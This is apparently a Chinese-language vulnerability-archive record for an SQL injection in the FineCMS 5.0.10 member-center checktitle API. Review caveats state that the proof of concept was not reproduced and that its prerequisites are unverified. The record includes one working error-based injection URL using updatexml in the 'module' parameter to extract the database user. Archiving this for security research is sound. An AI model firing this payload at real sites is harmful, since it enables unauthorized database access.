---
source: "hatch 补库批 20260928"
product: "FineCMS5.0.10 member API"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Finecms 5.0.10 会员中心sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：checktitle可达、news模型存在；会员鉴权未说明；DB支持updatexml并显错"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-900b7f7f77370621a791ae41"
entity_id: "ve-900b7f7f77370621a791ae41"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：checktitle可达、news模型存在；会员鉴权未说明；DB支持updatexml并显错

- **凭据与会话边界（1）**：只有URL和图，缺源码/请求会话/响应；不能由会员中心推断无登录。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **事实待核（2）**：与1815.2.0同module FROM注入原语，不同版本和错误/DNS通道应保留。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Finecms 5.0.10 会员中心sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Finecms 5.0.10

三、复现过程
------------

    http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a

![](./.resource/Finecms5.0.10会员中心sql注入漏洞/media/rId24.png)
